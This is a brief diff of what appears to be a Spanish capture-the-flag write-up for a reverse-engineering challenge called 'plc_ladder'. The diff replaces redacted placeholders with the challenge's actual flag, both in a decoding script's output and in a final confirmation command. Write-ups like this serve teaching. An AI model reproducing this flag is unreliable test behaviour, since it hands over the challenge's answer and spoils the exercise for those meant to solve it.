@@ -2268,13 +2313,13 @@ while i < len(prog)-1:
     elif prog[i]==4: break            # fin de programa
     else: i += 2
 print(flag)"
-[REDACTED]
+WHOAMI{vm_plc_s3ctor14}
 \`\`\`
 
 ### 5. Confirmar
 
 \`\`\`bash
-$ echo "[REDACTED]" | ./plc_ladder
+$ echo "WHOAMI{vm_plc_s3ctor14}" | ./plc_ladder
 [OK] Secuencia valida. Token = clave ingresada.
 \`\`\`
 
